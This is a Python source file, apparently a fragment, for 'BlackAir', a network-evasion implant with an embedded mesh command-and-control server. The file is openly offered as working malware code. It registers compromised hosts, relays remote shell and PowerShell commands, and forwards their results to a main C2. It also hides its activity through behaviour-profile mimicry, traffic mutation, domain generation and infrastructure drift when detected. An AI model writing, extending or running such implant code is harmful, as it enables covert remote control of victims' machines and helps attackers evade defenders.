"""
BlackAir - Advanced Network Evasion Implant for ErebusC2 Framework with Mesh C2 Capability
Provides adaptive traffic manipulation, detection avoidance, and remote C2 functionality
"""

# [Previous imports remain the same as in your original code]

# Add these new imports for server functionality
import socketserver
import ssl
import http.server
import threading
import queue
import ipaddress
from pathlib import Path


class MeshC2Server:
    """Provides command and control server functionality within the implant"""
    
    def __init__(self, config: Dict[str, Any], evasion_engine=None):
        """Initialize mesh C2 server
        
        Args:
            config: Server configuration
            evasion_engine: Reference to evasion engine for profile-based adaptation
        """
        self.config = config
        self.evasion_engine = evasion_engine
        
        # Server settings
        self.bind_host = config.get("bind_host", "0.0.0.0")
        self.bind_port = config.get("bind_port", 8443)
        self.max_implants = config.get("max_implants", 10)
        self.use_ssl = config.get("use_ssl", True)
        self.profile_based_scheduling = config.get("profile_based_scheduling", True)
        self.stealth_mode = config.get("stealth_mode", True)
        self.mesh_protocol = config.get("protocol", "https")
        
        # Operational state
        self.running = False
        self.server = None
        self.server_thread = None
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
        # Managed implants
        self.implants = {}  # implant_id -> implant_info
        self.implant_responses = {}  # command_id -> response
        self.implant_last_seen = {}  # implant_id -> timestamp
        
        # Authentication tokens
        self.tokens = config.get("tokens", {"default": hashlib.sha256("BlackAirMeshC2".encode()).hexdigest()})
        
        # Certificate paths for SSL
        self.cert_path = config.get("cert_path")
        self.key_path = config.get("key_path")
        
        # Create or load certificates if using SSL
        if self.use_ssl and (not self.cert_path or not self.key_path):
            self.cert_path, self.key_path = self._generate_certificates()
    
    def _generate_certificates(self) -> Tuple[str, str]:
        """Generate self-signed certificates for SSL
        
        Returns:
            Tuple of (cert_path, key_path)
        """
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            import datetime
            
            # Create certificate directory
            cert_dir = Path.home() / ".blackair" / "certs"
            cert_dir.mkdir(parents=True, exist_ok=True)
            
            # Paths for new certificates
            cert_path = cert_dir / "blackair.crt"
            key_path = cert_dir / "blackair.key"
            
            # Check if certificates already exist
            if cert_path.exists() and key_path.exists():
                return str(cert_path), str(key_path)
            
            # Generate private key
            key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # Hostname and IP will be used in certificate
            hostname = socket.gethostname()
            try:
                ip_address = socket.gethostbyname(hostname)
            except:
                ip_address = "127.0.0.1"
                
            # Certificate details
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "BlackAir Security"),
                x509.NameAttribute(NameOID.COMMON_NAME, hostname),
            ])
            
            # Build certificate
            cert = x509.CertificateBuilder()\
                .subject_name(subject)\
                .issuer_name(issuer)\
                .public_key(key.public_key())\
                .serial_number(x509.random_serial_number())\
                .not_valid_before(datetime.datetime.utcnow())\
                .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))\
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(hostname),
                        x509.IPAddress(ipaddress.IPv4Address(ip_address))
                    ]),
                    critical=False,
                )\
                .sign(key, hashes.SHA256(), default_backend())
            
            # Write private key to file
            with open(key_path, "wb") as f:
                f.write(key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption(),
                ))
            
            # Write certificate to file
            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            return str(cert_path), str(key_path)
            
        except ImportError:
            # Fallback to generating self-signed cert with OpenSSL
            import subprocess
            import tempfile
            
            cert_dir = Path.home() / ".blackair" / "certs"
            cert_dir.mkdir(parents=True, exist_ok=True)
            
            cert_path = cert_dir / "blackair.crt"
            key_path = cert_dir / "blackair.key"
            
            # Check if certificates already exist
            if cert_path.exists() and key_path.exists():
                return str(cert_path), str(key_path)
            
            # Generate using OpenSSL
            subprocess.run([
                "openssl", "req", "-new", "-newkey", "rsa:2048", "-days", "365",
                "-nodes", "-x509", "-subj", "/CN=BlackAirC2",
                "-keyout", str(key_path), "-out", str(cert_path)
            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return str(cert_path), str(key_path)
    
    def start(self) -> bool:
        """Start the C2 server
        
        Returns:
            Success status
        """
        if self.running:
            return True
            
        # Check if server should be active based on profile
        if self.profile_based_scheduling and self.evasion_engine:
            if not self.evasion_engine.behavior_profile.should_be_active():
                # Not a good time to run a server according to behavior profile
                return False
            
        try:
            # Start server in a separate thread
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.running = True
            return True
            
        except Exception as e:
            logging.error(f"Failed to start C2 server: {e}")
            return False
    
    def stop(self):
        """Stop the C2 server"""
        if not self.running:
            return
            
        self.running = False
        
        # Shutdown server
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
            
        # Wait for server thread to terminate
        if self.server_thread:
            self.server_thread.join(timeout=5)
            self.server_thread = None
    
    def _run_server(self):
        """Run the C2 server"""
        try:
            # Choose server implementation based on protocol
            if self.mesh_protocol in ["https", "http"]:
                self._run_http_server()
            elif self.mesh_protocol == "dns":
                self._run_dns_server()
            else:
                logging.error(f"Unsupported mesh protocol: {self.mesh_protocol}")
        except Exception as e:
            logging.error(f"Error in C2 server: {e}")
    
    def _run_http_server(self):
        """Run HTTP/HTTPS server for mesh C2"""
        class C2RequestHandler(http.server.BaseHTTPRequestHandler):
            # Reference to parent class
            parent = self
            
            def log_message(self, format, *args):
                # Suppress or redirect logs based on stealth mode
                if not self.parent.stealth_mode:
                    logging.debug(format % args)
            
            def do_POST(self):
                """Handle POST requests (commands, registrations, etc.)"""
                try:
                    # Get request content length
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    
                    # Parse path
                    if self.path == '/register':
                        self._handle_register(post_data)
                    elif self.path == '/heartbeat':
                        self._handle_heartbeat(post_data)
                    elif self.path == '/response':
                        self._handle_response(post_data)
                    else:
                        # Generic request - might be tunneled data
                        self._handle_generic_post(post_data)
                        
                except Exception as e:
                    logging.error(f"Error handling POST: {e}")
                    self.send_error(500, str(e))
            
            def do_GET(self):
                """Handle GET requests (command polling, etc.)"""
                try:
                    # Parse path
                    if self.path.startswith('/command'):
                        self._handle_command_request()
                    elif self.path == '/status':
                        self._handle_status_request()
                    else:
                        # Generic request
                        self._handle_generic_get()
                        
                except Exception as e:
                    logging.error(f"Error handling GET: {e}")
                    self.send_error(500, str(e))
            
            def _handle_register(self, post_data):
                """Handle implant registration"""
                try:
                    # Parse registration data
                    data = json.loads(post_data.decode('utf-8'))
                    
                    # Validate auth token
                    if not self.parent._validate_token(data.get("auth_token")):
                        self.send_error(403, "Invalid authentication")
                        return
                    
                    # Extract implant info
                    implant_id = data.get("implant_id")
                    if not implant_id:
                        self.send_error(400, "Missing implant ID")
                        return
                    
                    # Register implant
                    self.parent.register_implant(implant_id, data)
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    
                    response = json.dumps({
                        "status": "registered",
                        "server_time": datetime.utcnow().isoformat(),
                        "mesh_id": self.parent.config.get("mesh_id", "default")
                    })
                    
                    self.wfile.write(response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    self.send_error(400, "Invalid JSON")
                except Exception as e:
                    self.send_error(500, str(e))
            
            def _handle_heartbeat(self, post_data):
                """Handle implant heartbeat"""
                try:
                    # Parse heartbeat data
                    data = json.loads(post_data.decode('utf-8'))
                    
                    # Extract implant ID
                    implant_id = data.get("implant_id")
                    if not implant_id:
                        self.send_error(400, "Missing implant ID")
                        return
                    
                    # Update last seen timestamp
                    self.parent.update_implant_last_seen(implant_id)
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    
                    response = json.dumps({
                        "status": "acknowledged",
                        "server_time": datetime.utcnow().isoformat()
                    })
                    
                    self.wfile.write(response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    self.send_error(400, "Invalid JSON")
                except Exception as e:
                    self.send_error(500, str(e))
            
            def _handle_command_request(self):
                """Handle implant requesting commands"""
                try:
                    # Parse query parameters
                    query_params = {}
                    if '?' in self.path:
                        query_string = self.path.split('?', 1)[1]
                        for param in query_string.split('&'):
                            if '=' in param:
                                key, value = param.split('=', 1)
                                query_params[key] = value
                    
                    # Get implant ID from query
                    implant_id = query_params.get('id')
                    if not implant_id:
                        self.send_error(400, "Missing implant ID")
                        return
                    
                    # Update last seen timestamp
                    self.parent.update_implant_last_seen(implant_id)
                    
                    # Get pending commands for implant
                    commands = self.parent.get_pending_commands(implant_id)
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    
                    response = json.dumps({
                        "status": "success",
                        "commands": commands
                    })
                    
                    self.wfile.write(response.encode('utf-8'))
                    
                except Exception as e:
                    self.send_error(500, str(e))
            
            def _handle_response(self, post_data):
                """Handle command response from implant"""
                try:
                    # Parse response data
                    data = json.loads(post_data.decode('utf-8'))
                    
                    # Extract required fields
                    implant_id = data.get("implant_id")
                    command_id = data.get("command_id")
                    response_data = data.get("response")
                    
                    if not implant_id or not command_id:
                        self.send_error(400, "Missing required fields")
                        return
                    
                    # Store command response
                    self.parent.store_command_response(implant_id, command_id, response_data)
                    
                    # Update last seen timestamp
                    self.parent.update_implant_last_seen(implant_id)
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    
                    response = json.dumps({
                        "status": "success",
                        "server_time": datetime.utcnow().isoformat()
                    })
                    
                    self.wfile.write(response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    self.send_error(400, "Invalid JSON")
                except Exception as e:
                    self.send_error(500, str(e))
            
            def _handle_status_request(self):
                """Handle status request"""
                try:
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    
                    status = {
                        "status": "online",
                        "implants": len(self.parent.implants),
                        "server_time": datetime.utcnow().isoformat(),
                        "uptime": (datetime.utcnow() - self.parent._start_time).total_seconds()
                    }
                    
                    self.wfile.write(json.dumps(status).encode('utf-8'))
                    
                except Exception as e:
                    self.send_error(500, str(e))
            
            def _handle_generic_post(self, post_data):
                """Handle generic POST request"""
                # This could be implementing a more robust protocol or handling tunneled data
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                response = json.dumps({
                    "status": "received",
                    "bytes": len(post_data),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
                self.wfile.write(response.encode('utf-8'))
            
            def _handle_generic_get(self):
                """Handle generic GET request"""
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                response = json.dumps({
                    "status": "online",
                    "timestamp": datetime.utcnow().isoformat()
                })
                
                self.wfile.write(response.encode('utf-8'))
        
        # Track start time for uptime calculation
        self._start_time = datetime.utcnow()
        
        # Create and start server
        if self.use_ssl and self.cert_path and self.key_path:
            # HTTPS server
            self.server = http.server.ThreadingHTTPServer((self.bind_host, self.bind_port), C2RequestHandler)
            
            # Set up SSL context
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(self.cert_path, self.key_path)
            self.server.socket = ssl_context.wrap_socket(self.server.socket, server_side=True)
        else:
            # HTTP server
            self.server = http.server.ThreadingHTTPServer((self.bind_host, self.bind_port), C2RequestHandler)
            
        # Serve until shutdown
        try:
            self.server.serve_forever()
        except Exception as e:
            if self.running:  # Only log if not a normal shutdown
                logging.error(f"HTTP server error: {e}")
    
    def _run_dns_server(self):
        """Run DNS server for mesh C2"""
        # DNS server implementation would go here
        # For now, we'll just log that it's not implemented
        logging.warning("DNS server for mesh C2 not yet implemented")
    
    def _validate_token(self, token: str) -> bool:
        """Validate authentication token
        
        Args:
            token: Authentication token to validate
            
        Returns:
            True if token is valid
        """
        if not token:
            return False
            
        return token in self.tokens.values()
    
    def register_implant(self, implant_id: str, data: Dict[str, Any]):
        """Register a new implant in the mesh network
        
        Args:
            implant_id: Unique implant identifier
            data: Registration data
        """
        # Check if we've reached max implants
        if len(self.implants) >= self.max_implants:
            # Find oldest implant that hasn't been seen recently
            oldest_implant = None
            oldest_time = datetime.utcnow()
            
            for imp_id, last_seen in self.implant_last_seen.items():
                seen_time = datetime.fromisoformat(last_seen)
                if seen_time < oldest_time:
                    oldest_time = seen_time
                    oldest_implant = imp_id
                    
            # Remove oldest implant if it exists
            if oldest_implant:
                self.implants.pop(oldest_implant, None)
                self.implant_last_seen.pop(oldest_implant, None)
        
        # Store implant data
        self.implants[implant_id] = {
            "registration": data,
            "registered_at": datetime.utcnow().isoformat(),
            "commands": {}  # command_id -> command_data
        }
        
        # Update last seen
        self.update_implant_last_seen(implant_id)
    
    def update_implant_last_seen(self, implant_id: str):
        """Update the last seen timestamp for an implant
        
        Args:
            implant_id: Implant identifier
        """
        if implant_id in self.implants:
            self.implant_last_seen[implant_id] = datetime.utcnow().isoformat()
    
    def get_pending_commands(self, implant_id: str) -> List[Dict[str, Any]]:
        """Get pending commands for an implant
        
        Args:
            implant_id: Implant identifier
            
        Returns:
            List of command dictionaries
        """
        if implant_id not in self.implants:
            return []
            
        # Get all pending commands for this implant
        pending_commands = []
        implant_data = self.implants[implant_id]
        
        # Process command queue
        while not self.command_queue.empty():
            try:
                cmd = self.command_queue.get_nowait()
                
                # Check if command is for this implant or broadcast
                if cmd.get("implant_id") == implant_id or cmd.get("implant_id") == "*":
                    # Generate command ID if not present
                    if "command_id" not in cmd:
                        cmd["command_id"] = str(uuid.uuid4())
                        
                    # Store command in implant data
                    cmd_id = cmd["command_id"]
                    implant_data["commands"][cmd_id] = cmd
                    
                    # Add to pending commands
                    pending_commands.append(cmd)
                else:
                    # Put it back in the queue for other implants
                    self.command_queue.put(cmd)
                    
                # Mark queue task as done
                self.command_queue.task_done()
                    
            except queue.Empty:
                break
        
        return pending_commands
    
    def store_command_response(self, implant_id: str, command_id: str, response: Any):
        """Store a command response from an implant
        
        Args:
            implant_id: Implant identifier
            command_id: Command identifier
            response: Response data
        """
        # Store in response dictionary
        self.implant_responses[command_id] = {
            "implant_id": implant_id,
            "response": response,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Add to response queue for processing
        self.response_queue.put({
            "implant_id": implant_id,
            "command_id": command_id,
            "response": response
        })
    
    def send_command(self, implant_id: str, command: str) -> str:
        """Queue a command to be sent to an implant
        
        Args:
            implant_id: Target implant ID (or "*" for all implants)
            command: Command string
            
        Returns:
            Command ID
        """
        # Generate command ID
        command_id = str(uuid.uuid4())
        
        # Create command object
        cmd = {
            "implant_id": implant_id,
            "command_id": command_id,
            "command": command,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Queue command
        self.command_queue.put(cmd)
        
        return command_id
    
    def get_mesh_status(self) -> Dict[str, Any]:
        """Get status of the mesh network
        
        Returns:
            Dictionary with mesh status
        """
        active_implants = []
        inactive_implants = []
        
        # Current time for timestamp comparison
        now = datetime.utcnow()
        
        # Check each implant
        for implant_id, data in self.implants.items():
            # Get last seen timestamp
            last_seen_str = self.implant_last_seen.get(implant_id)
            
            if not last_seen_str:
                inactive_implants.append(implant_id)
                continue
                
            # Parse timestamp
            last_seen = datetime.fromisoformat(last_seen_str)
            
            # Check if recently active (within last 10 minutes)
            if (now - last_seen).total_seconds() < 600:  # 10 minutes
                active_implants.append(implant_id)
            else:
                inactive_implants.append(implant_id)
        
        return {
            "active": len(active_implants),
            "inactive": len(inactive_implants),
            "total": len(self.implants),
            "pending_commands": self.command_queue.qsize(),
            "pending_responses": self.response_queue.qsize(),
            "server_running": self.running
        }


class BlackAirImplant(BlackLinkImplant):
    """BlackAir implant - Advanced evasion and mesh C2 capabilities"""
    
    def __init__(self, config_dict: Optional[Dict[str, Any]] = None):
        """Initialize the BlackAir implant
        
        Args:
            config_dict: Configuration dictionary (optional)
        """
        # Call parent initialization
        super().__init__(config_dict)
        
        # Set implant type
        self.implant_type = "BlackAir"
        
        # Default BlackAir configuration
        self.air_config = {
            "evasion": {
                "behavior_profile": "office_worker",
                "evasion_level": 7,
                "randomize_execution": True,
                "traffic_mutation": {
                    "enabled": True,
                    "techniques": ["packet_fragmentation", "header_manipulation", 
                                  "protocol_tunneling", "timing_manipulation"],
                    "fragmentation_sizes": [128, 256, 512, 1024]
                },
                "infrastructure": {
                    "c2_servers": [],  # Main C2 servers
                    "relay_servers": [],  # Relay servers
                    "domains": [],  # Domains for communication
                    "dga_enabled": True,
                    "dga_seed": "BlackAir",
                    "drift_interval": 86400,  # 1 day
                    "drift_jitter": 20
                }
            },
            "mesh_c2": {
                "enabled": False,
                "bind_host": "0.0.0.0",
                "bind_port": 0,  # 0 = random port
                "max_implants": 5,
                "protocol": "https",
                "use_ssl": True,
                "profile_based_scheduling": True,
                "stealth_mode": True,
                "tokens": {}  # Authentication tokens
            }
        }
        
        # Override with config if provided
        if config_dict and "air_config" in config_dict:
            self._update_dict_recursive(self.air_config, config_dict["air_config"])
        
        # Initialize BlackAir components
        self._init_blackair_components()
        
        # Mesh C2 server component 
        self.mesh_c2 = None
        self.mesh_mode = self.air_config["mesh_c2"]["enabled"]
        
        if self.mesh_mode:
            self._init_mesh_c2()
    
    def _update_dict_recursive(self, base_dict, update_dict):
        """Update dictionary recursively
        
        Args:
            base_dict: Dictionary to update
            update_dict: Dictionary with updates
        """
        for key, value in update_dict.items():
            if key in base_dict and isinstance(base_dict[key], dict) and isinstance(value, dict):
                self._update_dict_recursive(base_dict[key], value)
            else:
                base_dict[key] = value
    
    def _init_blackair_components(self):
        """Initialize BlackAir specific components"""
        # Create evasion engine
        self.evasion_engine = DetectionEvasionEngine(self.air_config["evasion"])
    
    def _init_mesh_c2(self):
        """Initialize mesh C2 server component"""
        # Get configuration
        mesh_config = self.air_config["mesh_c2"]
        
        # Initialize C2 server
        self.mesh_c2 = MeshC2Server(mesh_config, self.evasion_engine)
    
    def start(self):
        """Start the implant operation"""
        # Start parent components
        super().start()
        
        # Start mesh C2 server if enabled
        if self.mesh_mode and self.mesh_c2:
            mesh_started = self.mesh_c2.start()
            logging.info(f"Mesh C2 server {'started' if mesh_started else 'failed to start'}")
    
    def stop(self):
        """Stop the implant operation"""
        # Stop mesh C2 server if running
        if self.mesh_c2:
            self.mesh_c2.stop()
        
        # Call parent stop method
        super().stop()
    
    def _main_loop(self):
        """Main operational loop"""
        retry_count = 0
        
        while self.running:
            try:
                # Apply evasion techniques
                if not self.evasion_engine.should_communicate():
                    # Not a good time to communicate according to behavior profile
                    delay = self.evasion_engine.get_next_checkin_delay(60)  # Base delay of 60s
                    time.sleep(delay)
                    continue
                
                # Check for commands from main C2
                if self.registered:
                    self._check_c2_commands()
                else:
                    # Try to register if not already registered
                    success = self._register_with_c2()
                    
                    if not success:
                        retry_count += 1
                        
                        # After enough retries, try to drift infrastructure
                        if retry_count >= self.config.get("max_retries", 5):
                            if self.evasion_engine.infrastructure_drifter.should_drift():
                                self.evasion_engine.infrastructure_drifter.drift()
                            retry_count = 0
                
                # Process any pending commands (possibly delayed for evasion)
                self._process_pending_commands()
                
                # Send heartbeat to maintain connection
                if self.registered:
                    self._send_heartbeat()
                
                # Process mesh C2 responses if in mesh mode
                if self.mesh_mode and self.mesh_c2:
                    self._process_mesh_responses()
                
                # Sleep with jitter before next check
                delay = self.evasion_engine.get_next_checkin_delay(
                    base_delay=self.config.get("sleep_time", 60)
                )
                time.sleep(delay)
                
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                time.sleep(60)  # Sleep on error
    
    def _process_pending_commands(self):
        """Process any pending commands from the execution plan"""
        pending_commands = self.evasion_engine.get_pending_commands()
        
        for plan in pending_commands:
            command = plan["command"]
            result = self._execute_command(command)
            
            # Report result if needed
            if result:
                self._report_result(command, result)
    
    def _process_mesh_responses(self):
        """Process responses from mesh-connected implants"""
        if not self.mesh_c2:
            return
            
        # Process up to 5 responses at a time
        for _ in range(5):
            try:
                # Get response from queue (non-blocking)
                response = self.mesh_c2.response_queue.get_nowait()
                
                # Forward response to main C2
                self._forward_mesh_response(response)
                
                # Mark as done
                self.mesh_c2.response_queue.task_done()
                
            except queue.Empty:
                break
    
    def _forward_mesh_response(self, response: Dict[str, Any]):
        """Forward a mesh implant response to the main C2
        
        Args:
            response: Response data from mesh implant
        """
        try:
            # Format response for forwarding
            forward_data = {
                "mesh_response": True,
                "mesh_id": self.config["implant_id"],
                "implant_id": response.get("implant_id"),
                "command_id": response.get("command_id"),
                "response": response.get("response"),
                "timestamp": datetime.utcnow().isoformat()
            }
            
            # Serialize
            message = json.dumps(forward_data)
            
            # Get active communication channel
            channel = self.channels.get(self.active_channel)
            if not channel:
                return
                
            # Send via active channel
            result = channel.send_data(
                data=message.encode('utf-8'),
                endpoint="/mesh/response",
                method="POST"
            )
            
            if not result:
                logging.warning("Failed to forward mesh response to main C2")
                
        except Exception as e:
            logging.error(f"Error forwarding mesh response: {e}")
    
    def _execute_command(self, command: str) -> str:
        """Execute a command from the C2 server
        
        Extends parent to add BlackAir-specific commands
        """
        try:
            # Parse command
            cmd_parts = command.split(maxsplit=1)
            cmd_type = cmd_parts[0].lower()
            cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ""
            
            # Handle BlackAir specific commands
            if cmd_type == "evasion":
                return self._cmd_evasion(cmd_args)
            elif cmd_type == "mesh":
                return self._cmd_mesh(cmd_args)
            elif cmd_type == "profile":
                return self._cmd_profile(cmd_args)
            elif cmd_type == "drift":
                return self._cmd_drift(cmd_args)
            elif cmd_type == "mutate":
                return self._cmd_mutate(cmd_args)
            elif cmd_type == "jitter":
                return self._cmd_jitter(cmd_args)
            elif cmd_type == "powershell":
                return self._cmd_powershell(cmd_args)
            
            # For other commands, try parent implementation
            return super()._execute_command(command)
            
        except Exception as e:
            logging.error(f"Command execution error: {e}")
            return f"Error executing command: {e}"
    
    def _cmd_evasion(self, args: str) -> str:
        """Configure evasion settings
        
        Format: status|set level [1-10]
        Examples: evasion status
                 evasion set level 8
        """
        parts = args.split()
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        
        if action == "status":
            status = self.evasion_engine.get_evasion_status()
            
            result = "Evasion Status:\n"
            result += f"Level: {status['evasion_level']}/10\n"
            result += f"Behavior profile: {status['behavior_profile']['type']}\n"
            result += f"Current persona: {status['behavior_profile']['persona_id']}\n"
            
            # Add additional evasion details
            result += "\nInfrastructure:\n"
            result += f"Active C2: {self.evasion_engine.infrastructure_drifter.get_active_c2()}\n"
            result += f"Active domain: {self.evasion_engine.infrastructure_drifter.get_active_domain()}\n"
            
            # Add traffic mutation details
            techniques = self.air_config["evasion"]["traffic_mutation"]["techniques"]
            result += "\nTraffic Mutations:\n"
            result += f"Enabled techniques: {', '.join(techniques)}\n"
            
            # Add mesh C2 status if enabled
            if self.mesh_mode and self.mesh_c2:
                mesh_status = self.mesh_c2.get_mesh_status()
                result += "\nMesh C2 Status:\n"
                result += f"Server running: {'Yes' if mesh_status['server_running'] else 'No'}\n"
                result += f"Connected implants: {mesh_status['active']}/{mesh_status['total']}\n"
            
            return result
            
        elif action == "set":
            if len(parts) < 3:
                return "Error: Missing parameters"
                
            setting = parts[1].lower()
            
            if setting == "level":
                try:
                    level = int(parts[2])
                    if level < 1 or level > 10:
                        return "Error: Level must be between 1 and 10"
                        
                    self.evasion_engine.evasion_level = level
                    return f"Evasion level set to {level}/10"
                    
                except ValueError:
                    return "Error: Invalid level value"
                    
            else:
                return f"Error: Unknown setting: {setting}"
                
        else:
            return f"Error: Unknown action: {action}"
    
    def _cmd_mesh(self, args: str) -> str:
        """Control mesh C2 functionality
        
        Format: status|start|stop|command implant_id "command"
        Examples: mesh status
                 mesh start
                 mesh stop
                 mesh command abc123 "shell whoami"
                 mesh command * "sleep 60"
        """
        parts = args.split(maxsplit=1)
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        action_args = parts[1] if len(parts) > 1 else ""
        
        if action == "status":
            if not self.mesh_c2:
                return "Mesh C2 functionality not available"
                
            status = self.mesh_c2.get_mesh_status()
            
            result = "Mesh C2 Status:\n"
            result += f"Server running: {'Yes' if status['server_running'] else 'No'}\n"
            result += f"Active implants: {status['active']}\n"
            result += f"Inactive implants: {status['inactive']}\n"
            result += f"Total implants: {status['total']}\n"
            result += f"Pending commands: {status['pending_commands']}\n"
            result += f"Pending responses: {status['pending_responses']}\n"
            
            # Add binding information
            if self.mesh_c2.server:
                host, port = self.mesh_c2.server.server_address
                result += f"\nServer binding: {host}:{port}\n"
                result += f"Protocol: {self.air_config['mesh_c2']['protocol']}\n"
                result += f"SSL enabled: {self.air_config['mesh_c2']['use_ssl']}\n"
            
            return result
            
        elif action == "start":
            if not self.mesh_c2:
                self._init_mesh_c2()
                
            if self.mesh_c2:
                if self.mesh_c2.running:
                    return "Mesh C2 server already running"
                    
                success = self.mesh_c2.start()
                if success:
                    self.mesh_mode = True
                    # Get binding information
                    if self.mesh_c2.server:
                        host, port = self.mesh_c2.server.server_address
                        return f"Mesh C2 server started on {host}:{port}"
                    else:
                        return "Mesh C2 server started"
                else:
                    return "Failed to start Mesh C2 server - check logs for details"
            else:
                return "Failed to initialize Mesh C2 server"
                
        elif action == "stop":
            if not self.mesh_c2 or not self.mesh_c2.running:
                return "Mesh C2 server not running"
                
            self.mesh_c2.stop()
            return "Mesh C2 server stopped"
            
        elif action == "command":
            if not self.mesh_c2:
                return "Mesh C2 functionality not available"
                
            cmd_parts = action_args.split(maxsplit=1)
            if len(cmd_parts) < 2:
                return "Error: Missing implant ID or command"
                
            implant_id = cmd_parts[0]
            command = cmd_parts[1].strip('"\'')  # Remove quotes if present
            
            command_id = self.mesh_c2.send_command(implant_id, command)
            
            target = implant_id if implant_id != "*" else "all implants"
            return f"Command sent to {target}, ID: {command_id}"
            
        else:
            return f"Error: Unknown action: {action}"
    
    def _cmd_profile(self, args: str) -> str:
        """Control behavior profile
        
        Format: status|set profile_type|rotate
        Examples: profile status
                 profile set office_worker
                 profile set developer
                 profile set server
                 profile rotate
        """
        parts = args.split()
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        
        if action == "status":
            profile = self.evasion_engine.behavior_profile
            persona = profile.current_persona
            
            result = "Behavior Profile Status:\n"
            result += f"Profile type: {profile.profile_type}\n"
            result += f"Current persona ID: {persona.get('id')}\n"
            result += f"Persona created: {persona.get('generated_at')}\n"
            result += f"Last rotation: {profile.last_rotation.isoformat()}\n"
            result += f"User agent: {persona.get('user_agent')}\n"
            
            # Add current activity probability
            activity_prob = profile.get_activity_probability()
            result += f"\nCurrent activity probability: {activity_prob:.2f}\n"
            
            # Add preferred domains
            preferred_domains = persona.get("preferred_domains", [])
            if preferred_domains:
                result += "\nPreferred domains:\n"
                for domain in preferred_domains:
                    result += f"- {domain}\n"
            
            return result
            
        elif action == "set":
            if len(parts) < 2:
                return "Error: Missing profile type"
                
            profile_type = parts[1].lower()
            
            # Check if profile type is valid
            valid_types = ["office_worker", "developer", "server", "generic"]
            if profile_type not in valid_types:
                return f"Error: Invalid profile type. Valid types: {', '.join(valid_types)}"
                
            # Create new profile
            self.evasion_engine.behavior_profile = NetworkBehaviorProfile(profile_type)
            
            return f"Behavior profile set to {profile_type}"
            
        elif action == "rotate":
            # Rotate persona
            old_persona = self.evasion_engine.behavior_profile.current_persona
            new_persona = self.evasion_engine.behavior_profile.rotate_persona()
            
            result = "Persona rotated:\n"
            result += f"Old persona ID: {old_persona.get('id')}\n"
            result += f"New persona ID: {new_persona.get('id')}\n"
            
            return result
            
        else:
            return f"Error: Unknown action: {action}"
    
    def _cmd_drift(self, args: str) -> str:
        """Control infrastructure drifting
        
        Format: status|now [full]
        Examples: drift status
                 drift now
                 drift now full
        """
        parts = args.split()
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        
        if action == "status":
            drifter = self.evasion_engine.infrastructure_drifter
            
            result = "Infrastructure Drift Status:\n"
            result += f"Active C2: {', '.join(drifter.current_c2) if drifter.current_c2 else 'None'}\n"
            result += f"Active relays: {', '.join(drifter.current_relays) if drifter.current_relays else 'None'}\n"
            result += f"Active domains: {', '.join(drifter.current_domains) if drifter.current_domains else 'None'}\n"
            result += f"Last drift: {drifter.last_drift_time.isoformat()}\n"
            
            # Add drift triggers
            result += "\nDrift triggers:\n"
            result += f"Connection failures: {drifter.connection_failures}\n"
            result += f"Traffic volume: {drifter.traffic_volume} bytes\n"
            result += f"Detection indicators: {drifter.detection_indicators}\n"
            
            return result
            
        elif action == "now":
            drifter = self.evasion_engine.infrastructure_drifter
            
            # Check if full drift requested
            force_full = len(parts) > 1 and parts[1].lower() == "full"
            
            # Perform drift
            drift_info = drifter.drift(force_full_drift=force_full)
            
            # Extract result info
            components = drift_info["components"]
            
            result = "Infrastructure drift complete:\n"
            
            if components["c2"]["drifted"]:
                result += f"C2 servers: {', '.join(components['c2']['new']) if components['c2']['new'] else 'None'}\n"
                
            if components["relays"]["drifted"]:
                result += f"Relay servers: {', '.join(components['relays']['new']) if components['relays']['new'] else 'None'}\n"
                
            if components["domains"]["drifted"]:
                result += f"Domains: {', '.join(components['domains']['new']) if components['domains']['new'] else 'None'}\n"
            
            return result
            
        else:
            return f"Error: Unknown action: {action}"
    
